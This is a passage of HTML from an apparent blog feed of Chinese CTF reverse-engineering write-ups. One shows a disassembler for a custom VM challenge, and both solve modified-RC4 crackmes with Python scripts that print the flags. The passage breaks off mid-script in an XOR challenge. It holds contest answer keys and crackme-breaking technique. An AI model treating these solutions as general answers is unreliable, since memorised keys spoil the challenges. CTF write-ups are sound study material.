class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x10</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF0</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF3</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF7</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xF0</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF7</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0xF3</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0xF2</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xF0</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF2</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF4</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF4</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xF0</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xE0</span>, <span class="number">0x02</span>, <span class="number">0xF4</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0xF7</span>, <span class="number">0x94</span>, <span class="number">0xF8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(codes)):</span></span><br><span class="line"><span class="comment">#     print(((codes[i]+0x10)),end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line">op=<span class="number">0</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> op &lt; <span class="built_in">len</span>(codes):</span><br><span class="line">    optemp = (codes[op]+<span class="number">0x10</span>) &amp; <span class="number">0xff</span>  <span class="comment">#用 &amp; 0xff 运算符时，将整数值限制在 0 到 255 的范围内</span></span><br><span class="line">    <span class="keyword">if</span>(optemp &gt;=<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%04x:&quot;</span> % (op),end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> optemp == <span class="number">0</span>: <span class="comment">#进入fun0</span></span><br><span class="line">        step=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(codes[op+step]&lt;<span class="number">0xf0</span>):</span><br><span class="line">          step+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(step==<span class="number">4</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&#x27;a%d = 0x%x&#x27;</span> % (codes[op+<span class="number">2</span>],codes[op+<span class="number">3</span>]))</span><br><span class="line">        <span class="keyword">elif</span>(step==<span class="number">5</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;a%d = a%d&quot;</span> % (codes[op+<span class="number">2</span>],codes[op+<span class="number">4</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          <span class="keyword">assert</span> step == <span class="number">6</span></span><br><span class="line">          <span class="keyword">if</span>(codes[op+<span class="number">1</span>]==<span class="number">0xE0</span>):</span><br><span class="line">            <span class="keyword">if</span>(codes[op+<span class="number">4</span>]==<span class="number">0xE0</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;a%d = [a%d]&quot;</span> % (codes[op+<span class="number">2</span>],codes[op+<span class="number">5</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;a%d = [0x%x]&quot;</span> % (codes[op+<span class="number">2</span>],(codes[op+<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + codes[op+<span class="number">4</span>]))</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> codes[op+<span class="number">1</span>] == <span class="number">0xE1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[a%d] = a%d&quot;</span> % (codes[op+<span class="number">3</span>],codes[op+<span class="number">5</span>]))</span><br><span class="line">        op+=step</span><br><span class="line">    <span class="keyword">elif</span>(optemp== <span class="number">1</span>): <span class="comment">#进入fun1</span></span><br><span class="line">        <span class="keyword">if</span>(codes[op+<span class="number">3</span>]==<span class="number">0xE0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;a%d += a%d&quot;</span> % (codes[op+<span class="number">2</span>],codes[op+<span class="number">4</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;a%d += 0x%x&quot;</span> % (codes[op+<span class="number">2</span>],(codes[op+<span class="number">4</span>]&lt;&lt;<span class="number">8</span>) + codes[op+<span class="number">3</span>]))</span><br><span class="line">        op+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span>(optemp == <span class="number">2</span>): <span class="comment">#进入fun2</span></span><br><span class="line">        <span class="keyword">if</span>(codes[op+<span class="number">3</span>]==<span class="number">0xE0</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;a%d %%= a%d&quot;</span> % (codes[op+<span class="number">2</span>],codes[op+<span class="number">4</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;a%d %%= 0x%x&quot;</span> % (codes[op+<span class="number">2</span>],(codes[op+<span class="number">4</span>]&lt;&lt;<span class="number">8</span>) + codes[op+<span class="number">3</span>]))</span><br><span class="line">        op+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span>(optemp == <span class="number">3</span>): <span class="comment">#fun3</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a%d++&quot;</span> % codes[op+<span class="number">2</span>])</span><br><span class="line">        op+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span>(optemp == <span class="number">4</span>):  <span class="comment">#fun4</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a%d--&quot;</span>% codes[op+<span class="number">2</span>])</span><br><span class="line">        op+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span>(optemp == <span class="number">5</span>):  <span class="comment">#fun5</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;a%d ^= a%d&quot;</span> % (codes[op+<span class="number">2</span>],codes[op+<span class="number">4</span>]))</span><br><span class="line">        op+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span>(optemp == <span class="number">6</span>):  <span class="comment">#fun6</span></span><br><span class="line">          <span class="keyword">if</span>(codes[op+<span class="number">2</span>] &lt; ((codes[op+<span class="number">4</span>]&lt;&lt;<span class="number">8</span>) + codes[op+<span class="number">3</span>])):</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag = %d&quot;</span> % flag)</span><br><span class="line">          op+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span>(optemp == <span class="number">7</span>):</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">1</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;goto 0x%04x&quot;</span> % codes[op+<span class="number">1</span>])</span><br><span class="line">          flag=<span class="number">0</span></span><br><span class="line">        op+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="built_in">print</span>(<span class="number">666</span>)  <span class="comment">#检测错误异常</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行出来的结果如下：给出了一部分提示注释，用于方便与后面的解密脚本对应</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x0000</span>: a2 = 0x0</span><br><span class="line"><span class="attribute">0x0004</span>: a0 = a2</span><br><span class="line"><span class="attribute">0x0009</span>: [a2] = a2</span><br><span class="line"><span class="attribute">0x000f</span>: a1 = 0x10</span><br><span class="line"><span class="attribute">0x0013</span>: a0 %= a1</span><br><span class="line"><span class="attribute">0x0018</span>: a0 += 0x220</span><br><span class="line"><span class="attribute">0x001d</span>: a0 = [a0]</span><br><span class="line"><span class="attribute">0x0023</span>: a1 = a2</span><br><span class="line"><span class="attribute">0x0028</span>: a1 += 0x100</span><br><span class="line"><span class="attribute">0x002d</span>: [a1] = a0</span><br><span class="line"><span class="attribute">0x0033</span>: a2++</span><br><span class="line"><span class="attribute">0x0036</span>: flag = 1</span><br><span class="line"><span class="attribute">0x003b</span>: goto 0x0004</span><br><span class="line"><span class="attribute">0x003d</span>: a2 = 0x0//(a2=i)</span><br><span class="line"><span class="attribute">0x0041</span>: a3 = 0x0//(a3=j)</span><br><span class="line"><span class="attribute">0x0045</span>: a0 = [a2]</span><br><span class="line"><span class="attribute">0x004b</span>: a3 += a0</span><br><span class="line"><span class="attribute">0x0050</span>: a0 = a2</span><br><span class="line"><span class="attribute">0x0055</span>: a0 += 0x100</span><br><span class="line"><span class="attribute">0x005a</span>: a0 = [a0]</span><br><span class="line"><span class="attribute">0x0060</span>: a3 += a0</span><br><span class="line"><span class="attribute">0x0065</span>: a3 %= 0x100</span><br><span class="line"><span class="attribute">0x006a</span>: a0 = [a2]</span><br><span class="line"><span class="attribute">0x0070</span>: a1 = [a3]</span><br><span class="line"><span class="attribute">0x0076</span>: [a3] = a0</span><br><span class="line"><span class="attribute">0x007c</span>: [a2] = a1</span><br><span class="line"><span class="attribute">0x0082</span>: a2++</span><br><span class="line"><span class="attribute">0x0085</span>: flag = 1</span><br><span class="line"><span class="attribute">0x008a</span>: goto 0x0045</span><br><span class="line"><span class="attribute">0x008c</span>: a2 = 0x0(a2=i)</span><br><span class="line"><span class="attribute">0x0090</span>: a3 = 0x0(a3=j)</span><br><span class="line"><span class="attribute">0x0094</span>: a2++</span><br><span class="line"><span class="attribute">0x0097</span>: a2 %= 0x100</span><br><span class="line"><span class="attribute">0x009c</span>: a0 = [a2]</span><br><span class="line"><span class="attribute">0x00a2</span>: a3 += a0</span><br><span class="line"><span class="attribute">0x00a7</span>: a3 %= 0x100</span><br><span class="line"><span class="attribute">0x00ac</span>: a0 = [a2]</span><br><span class="line"><span class="attribute">0x00b2</span>: a1 = [a3]//交换值</span><br><span class="line"><span class="attribute">0x00b8</span>: [a3] = a0</span><br><span class="line"><span class="attribute">0x00be</span>: [a2] = a1</span><br><span class="line"><span class="attribute">0x00c4</span>: a0 += a1</span><br><span class="line"><span class="attribute">0x00c9</span>: a0 %= 0x100</span><br><span class="line"><span class="attribute">0x00ce</span>: a0 = [a0]</span><br><span class="line"><span class="attribute">0x00d4</span>: a1 = a2</span><br><span class="line"><span class="attribute">0x00d9</span>: a1--</span><br><span class="line"><span class="attribute">0x00dc</span>: a1 += 0x200//密文的位置偏移</span><br><span class="line"><span class="attribute">0x00e1</span>: a1 = [a1]</span><br><span class="line"><span class="attribute">0x00e7</span>: a0 ^= a1</span><br><span class="line"><span class="attribute">0x00ec</span>: a0 += a2***此处与循环变量a2有一个累加的魔改***</span><br><span class="line"><span class="attribute">0x00f1</span>: a1 = a2</span><br><span class="line"><span class="attribute">0x00f6</span>: a1--</span><br><span class="line"><span class="attribute">0x00f9</span>: a1 += 0x200</span><br><span class="line"><span class="attribute">0x00fe</span>: [a1] = a0</span><br><span class="line"><span class="attribute">0x0104</span>: a1 = a2</span><br><span class="line"><span class="attribute">0x0109</span>: a1--</span><br><span class="line"><span class="attribute">0x010c</span>: flag = 1</span><br><span class="line"><span class="attribute">0x0111</span>: goto 0x0094</span><br></pre></td></tr></table></figure><p>前面两部分循环分析完基本感觉就是RC4加密，然后最后打星号部分即是有一个与循环变量a2有一个累加的过程</p><p>最后改一下经典的RC4解密模板就行了，贴出脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x31</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x31</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>]  <span class="comment"># 秘钥 = This_1s_f1lLllag</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0x56</span>, <span class="number">0x54</span>, <span class="number">0xD9</span>, <span class="number">0xB5</span>, <span class="number">0xF3</span>, <span class="number">0xB1</span>, <span class="number">0xFD</span>, <span class="number">0x67</span>, <span class="number">0x15</span>, <span class="number">0xEE</span>, </span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0x68</span>, <span class="number">0xB7</span>, <span class="number">0x2B</span>, <span class="number">0x4A</span>, <span class="number">0x64</span>, <span class="number">0x10</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0xDE</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x26</span>, <span class="number">0x0F</span>, <span class="number">0x2A</span>, <span class="number">0x41</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x98</span>, <span class="number">0x9E</span>, </span><br><span class="line">  <span class="number">0x79</span>, <span class="number">0x5E</span>] <span class="comment"># 密文  = VT\x1FF36\xB5\x1FF36\xB1\xFDg\x15\x1FF36\xB0h\xB7+Jd\x10\x27R\x1FF36C&amp;\x0F*A0u0\x98\x9Ey^ </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化 S 盒和密钥调度算法所需的 T 盒</span></span><br><span class="line">S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">T = [key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)] </span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + T[i]) % <span class="number">256</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    a = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + S[a]) % <span class="number">256</span></span><br><span class="line">    S[a], S[j] = S[j], S[a]</span><br><span class="line">    k = S[(S[a] + S[j]) % <span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((table[i]-a) ^ k) &amp; <span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>) <span class="comment">#对明文字符进行异或运算还有一个减去循环变量 a 的操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;711df52879efbcb8964b6056d926ea35&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第九届中国海洋大学信息安全竞赛-WP</title>
      <link href="/posts/1d775006.html"/>
      <url>/posts/1d775006.html</url>
      
        <content type="html"><![CDATA[<h1>第九届中国海洋大学信息安全竞赛-WP by Rweb</h1><p>虽然校外组 24</p><h2 id="Reverse">Reverse</h2><h3 id="一-钩子">一.钩子</h3><p>​顾名思义，盲猜是一手hook api的题，无壳，载入ida之后直接找一手真正的加密逻辑，先shift+f12看一手字符串。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435696-1172627819.png" alt="image-20240427135606607"></p><p>​看到假flag之后直接接着这个假的判断逻辑函数接着往上溯源，选中函数sub_7FF71CC712C0摁x，然后往回逆</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436149-1180463944.png" alt="image-20240427140033724"></p><p>​继续选中StartAddress，摁x往回逆，然后到最后发现就是在装载主程序之前有先创建一个StartAddress的线程的操作，对于真正的加密逻辑进行了一个勾取</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435996-1898756876.png" alt="image-20240427140206738"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435675-1966664395.png" alt="image-20240427140514030"></p><p>​步入StartAddress，进入下图的RC4中（此处函数我已重命名）</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435550-1701610135.png" alt="image-20240427140551509"></p><p>​然后就经典RC4魔改，取出密文，直接解密</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000435681-649667675.png" alt="image-20240427141118804"></p><p>​贴出解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key=[ <span class="number">136</span>, <span class="number">227</span>, <span class="number">238</span>,  <span class="number">17</span>, <span class="number">198</span>,  <span class="number">73</span>, <span class="number">116</span>, <span class="number">165</span>, <span class="number">221</span>, <span class="number">152</span>, </span><br><span class="line">   <span class="number">89</span>, <span class="number">233</span>,  <span class="number">72</span>, <span class="number">247</span>, <span class="number">110</span>, <span class="number">191</span>,  <span class="number">58</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">223</span>, </span><br><span class="line">   <span class="number">16</span>,  <span class="number">66</span>, <span class="number">255</span>, <span class="number">153</span>, <span class="number">108</span>, <span class="number">227</span>,  <span class="number">62</span>,   <span class="number">5</span>,  <span class="number">44</span>, <span class="number">101</span>, </span><br><span class="line">   <span class="number">71</span>, <span class="number">239</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table=[  <span class="number">2</span>, <span class="number">204</span>,  <span class="number">71</span>, <span class="number">179</span>,  <span class="number">77</span>, <span class="number">108</span>, <span class="number">253</span>, <span class="number">154</span>,  <span class="number">76</span>,  <span class="number">78</span>, </span><br><span class="line">  <span class="number">212</span>, <span class="number">139</span>,  <span class="number">30</span>, <span class="number">129</span>,  <span class="number">25</span>,  <span class="number">10</span>,  <span class="number">52</span>,  <span class="number">38</span>, <span class="number">208</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">182</span>, <span class="number">176</span>, <span class="number">146</span>,  <span class="number">73</span>, <span class="number">179</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">T = [key[i % <span class="built_in">len</span>(key)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">v9=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v9=(T[j]+S[j]+v9)%<span class="number">256</span></span><br><span class="line">    S[j],S[v9]=S[v9],S[j]</span><br><span class="line"></span><br><span class="line">a1=<span class="number">26</span></span><br><span class="line">v6=<span class="number">0</span></span><br><span class="line">v8=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    v6=(v6+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    v8=(S[v6]+v8)%<span class="number">256</span></span><br><span class="line">    S[v6],S[v8]=S[v8],S[v6]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(table[k]^S[(S[v8]+S[v6])%<span class="number">256</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;ho00OoOoOoked_gotcha&#125;</span></span><br></pre></td></tr></table></figure><h3 id="二-xor">二.xor++</h3><p>签到题，没啥好说的，直接贴出脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">37</span>,<span class="number">40</span>, <span class="number">36</span>,<span class="number">33</span>, <span class="number">60</span>, <span 